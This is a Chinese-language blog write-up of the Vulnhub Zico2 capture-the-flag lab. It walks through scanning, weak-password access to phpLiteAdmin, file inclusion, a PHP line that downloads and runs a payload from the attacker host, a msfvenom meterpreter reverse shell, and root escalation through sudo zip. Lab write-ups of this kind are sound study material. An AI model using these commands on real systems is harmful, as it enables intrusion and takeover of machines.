---
title: Vulnhub靶机渗透笔记——Zico2 
date: 2019-02-26 10:30:34
tags:
	- 文件包含
	- Getshell
	- 权限提升
	- 靶机
categories:
	- Vulnhub
---

## 0x00 环境

- 靶机：[Zico2](https://www.vulnhub.com/series/zico2,137/#modal210download)
- 攻击机：Kali Linux
- VirtualBox
  - 网络连接方式：host-only、DHCP
- 目标：boot2root获取flag。

<!-- more -->

## 0x01 信息收集与漏洞挖掘

**1.主机发现：**`nmap -sn 192.168.110.0/24`

靶机自动获取IP，使用nmap进行主机发现，最终确定：靶机IP为192.168.110.3、攻击机IP：192.168.110.4、宿主机：192.168.110.5。

![](hack-zico\discovery.png)

**2.端口探测：**`nmap -Pn -sV -n -T4 -p- 192.168.110.3`

端口探测结果如下图，关注端口号22的SSH服务以及端口号80的Web服务。

还确定了靶机系统为Ubuntu Linux、Web容器为Apache。

![](hack-zico\port.png)

**3.Web服务**

- 服务探测：`whatweb http://192.168.110.3 -a 3`

![](hack-zico\whatweb.png)

- 目录爆破：`dirb http://192.168.110.3`

爆破发现dbadmin，访问发现存在目录遍历漏洞，且目录下存在test_db.php文件。

![](hack-zico\dirb.png)

![](hack-zico\dbadmin.png)

访问test_db.php发现是sqlite数据库连接管理页面phpLiteAdmin（类似phpmyadmin），尝试弱口令admin，成功进入。

进入数据库管理页面后可获得以下信息：

> 数据库路径：`/usr/databases/`
>
> 数据库名：`test_users`
>
> 数据表：`info`

![](hack-zico\1.png)

查看数据表info，发现里面存在两条记录，判断是用户的用户名和密码。将密码拿到[somd5](https://www.somd5.com/)网站解密，得到结果：

> root  34kroot34
>
> zico  zico2215@

将得到的两个用户名密码尝试进行SSH登录，结果失败。

- 漏洞扫描

使用宿主机的AWVS进行漏洞扫描，发现存在文件包含、目录穿越漏洞。存在漏洞的连接为：`http://192.168.110.3/view.php?page=tools.html`

![](hack-zico\2.png)

验证漏洞，尝试包含/etc/passwd文件，发现成功包含。

![](hack-zico\3.png)

## 0x02 Getshell

sqlite属于单文件数据库，类似Access数据库。

**1.思路一**

尝试通过数据库管理页面创建数据库的功能点创建一个shell文件，创建`../../var/www/html/shell.php`，`/`会被过滤，该方法不可行。

**2.思路二：文件包含Getshell**

先尝试通过日志文件`/var/log/apache2/access.log`，先访问`http://192.168.110.3/<?php phpinfo();?>`，然后尝试包含日志文件，发现没用。猜测是因为没有读取权限。

包含数据库文件Getshell

首先通过phpLiteAdmin向info表插入一条数据：`<?php system("cd /tmp;wget http://192.168.110.4/shell;chmod +x shell;./shell");?>`，该记录作用是进入/tmp目录，然后通过wget从攻击机上下载shell文件，再对shell文件添加执行权限然后运行。

![](hack-zico\4.png)

然后在攻击机上使用msfvenon生成shell文件：`msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.110.4 lport=4444 -f elf > shell`

在shell文件所在的路径建立一个简单HTTP服务器：`python -m SimpleHTTPServer 80`

设置msf监听，`use exploit/multi/hander`、`set payload linux/x86/meterpreter/reverse_tcp`、`set lhost 192.168.110.4`。

访问连接`http://192.168.110.3/view.php?page=../../usr/databases/test_users`，然后会得到一个meterpreter会话。

![](hack-zico\5.png)

## 0x03 权限提升

获得靶机shell后查看用户，发现不是root，需要提权。

![](hack-zico\7.png)

首先查看`/etc/passwd`文件，找出id大于1000的用户，发现值得关注的用户有root、zico。

![](hack-zico\8.png)

查找属主为zico的文件：`find / -user zico 2> /dev/null`，执行后结果过多。直接`cd /home/zico`到zico的家目录。发现其中有个wordpress目录，猜测应该是博客系统代码。进入该目录发现wordpress的配置文件wp-config.php，查看文件内容，找到数据库密码：`sWfCsfJSPV9H3AmQzw8`。

![](hack-zico\9.png)

尝试使用该用户名密码登录SSH：`ssh zico@sWfCsfJSPV9H3AmQzw8`。成功登录。

使用`sudo -l`命令查看zico用户可以执行的root命令。发现可以执行`/bin/tar`、`/usr/bin/zip`。

![](hack-zico\10.png)

执行`touch /tmp/exploit`、`sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command="bash -c /bin/sh"`

成功提权至root。

![](hack-zico\11.png)

获取flag，进入root用户家目录，flag在目录下的flag.txt文件。

![](hack-zico\12.png)

**另一种提权方式**

获得反弹shell后，查看系统内核版本，发现内核版本为3.2.0-23。

![](hack-zico\13.png)

到[Exploit-DB](https://www.exploit-db.com/search)搜索内核提权漏洞，并下载Exp到靶机编译执行。

![](hack-zico\14.png)

## 0x04 总结

- 文件包含Getshell，还可以尝试包含其他文件，如SSH登录日志文件等。
- Python2搭建简单HTTP服务器来传文件：`python -m SimpleHTTPServer 80`
- 上传/执行文件遇权限问题时，可传到`/tmp`目录。

**参考连接**

https://www.colabug.com/1925534.html